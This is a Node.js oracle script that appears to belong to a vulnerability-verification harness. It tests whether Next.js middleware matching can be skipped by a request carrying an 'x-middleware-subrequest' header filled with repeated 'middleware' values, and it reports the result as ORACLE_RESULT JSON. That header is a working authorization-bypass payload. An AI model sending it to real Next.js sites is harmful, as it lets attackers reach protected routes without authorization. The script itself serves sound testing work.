const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function out() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

(async () => {
  const marker = 'next-mw-authz-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const appDir = path.join(os.tmpdir(), marker);

  try {
    let NextRequest;
    let match;
    try {
      ({ NextRequest } = require('next/server'));
      ({ match } = require('next/dist/server/web/middleware-route-matcher'));
    } catch (e) {
      evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
      return out();
    }

    if (typeof NextRequest !== 'function' || typeof match !== 'function') {
      evidence = 'unexpected_exports';
      return out();
    }

    fs.mkdirSync(appDir, { recursive: true });

    // Middleware-style matcher protecting /protected/:path*
    const middlewareMatcher = {
      regexp: '^/protected(?:/.*)?$',
      originalSource: '/protected/:path*'
    };

    let doesMatch;
    try {
      doesMatch = match([middlewareMatcher]);
    } catch (e) {
      evidence = 'setup_exception:' + (e && e.message ? e.message : String(e));
      return out();
    }

    // Benign request should be considered for middleware (protected path)
    let benignMatched;
    try {
      const benignReq = new NextRequest('https://example.test/protected/area');
      benignMatched = !!doesMatch('/protected/area', benignReq, {});
    } catch (e) {
      evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
      return out();
    }

    if (!benignMatched) {
      evidence = 'benign_failed:not_matched';
      return out();
    }

    operation_completed = true;

    // Malicious header that should never allow skipping middleware protection
    try {
      const maliciousReq = new NextRequest('https://example.test/protected/area', {
        headers: {
          'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'
        }
      });
      const maliciousMatched = !!doesMatch('/protected/area', maliciousReq, {});

      // Vulnerable behavior: malicious request is NOT matched (middleware bypassed)
      exploit_succeeded = !maliciousMatched;
      evidence = 'benign_matched=' + (benignMatched ? '1' : '0') + '|malicious_matched=' + (maliciousMatched ? '1' : '0') + '|tmp=' + appDir;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
    }

    return out();
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
    return out();
  }
})();
